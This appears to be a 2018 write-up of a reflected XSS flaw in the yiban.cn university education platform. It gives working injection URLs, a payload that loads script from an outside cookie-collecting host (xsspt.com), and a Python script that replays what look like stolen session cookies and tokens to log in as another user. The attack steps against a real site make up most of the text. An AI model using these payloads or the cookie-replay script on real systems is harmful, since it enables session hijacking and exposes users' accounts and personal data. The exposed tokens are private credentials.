## There are reflective XSS vulnerabilities in the educational platform of Chinese colleges and universities, and the aggressive URL URL can be used to attract and steal the user cookie to realize the landing and other operations.Specific vulnerabilities are analyzed as follows  
First, the parameter k is extracted from an article, which mistaken the K to the front end for unfiltered use.
> http://www.yiban.cn//project/haiyang_2015yxj/articlelist.php?k=%E3%80%90%E5%90%83%E3%80%919428
### At this time we tried to splice the function of the front-end JS
At this time we tried to splice the function of the front-end JS  
http://www.yiban.cn//project/haiyang_2015yxj/articlelist.php?k=%E3%80%90%E5%90%83%E3%80%919428';}
### Then we continue to splice the JS code. We see that it can be executed, that is, there is no filtering for k.
![](https://1aker.cn/picture/QQ%E6%88%AA%E5%9B%BE20180529225214.png)
http://www.yiban.cn//project/haiyang_2015yxj/articlelist.php?k=%E3%80%90%E5%90%83%E3%80%919428';}</scRIPt><script>alert(1)</script>
## Ok,now we can splice up our malicious JS code (for testing purposes only), and then entice the user to click, so we can steal the cookies of the user.
![](https://1aker.cn/picture/QQ%E6%88%AA%E5%9B%BE20180530070412.png)
http://www.yiban.cn//project/haiyang_2015yxj/articlelist.php?k=%E3%80%90%E5%90%83%E3%80%919428';}</scRIPt><script src=http://xsspt.com/8cwW2O?1527634980></script>
### Then we used the stolen cookie to login, obviously we succeeded.
![](https://1aker.cn/picture/QQ%E6%88%AA%E5%9B%BE20180530070513.png)
We look at the login information through the script
![](https://1aker.cn/picture/QQ%E6%88%AA%E5%9B%BE20180530071420.png)
### Vulnerability utilization test scripts are as follows
```
import requests

headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'}
cookie = {'YB_SSID':'10c30a35561316b0032bb1c78cbdd656', 'UM_distinctid':"163ae2270ea1240-\059a6c2a729ae-5b452a1d-e1000-163ae2270ee1a4", 'SL_GWPT_Show_Hide_tmp':'1', 'yiban_user_token':'37a9f9d92ef0efa4b6258ac8d5d05b38', 'CNZZDATA1253488264':'792648766-1527631606-null%7C1527631606', '_cnzz_CV1253488264':'%E5%AD%A6%E6%A0%A1%E9%A1%B5%E9%9D%A2%7C%3A%2FIndex%2FIndex%2Findex%7C1527635160910%26%E5%AD%A6%E6%A0%A1%E5%90%8D%E7%A7%B0%7C%E5%85%B6%E4%BB%96%7C1527635160910', 'SL_wptGlobTipTmp':'1'}
res = requests.get(url='http://www.yiban.cn/user/index/index/user_id/8777259',cookies=cookie,headers=headers)
print(res.text)


```
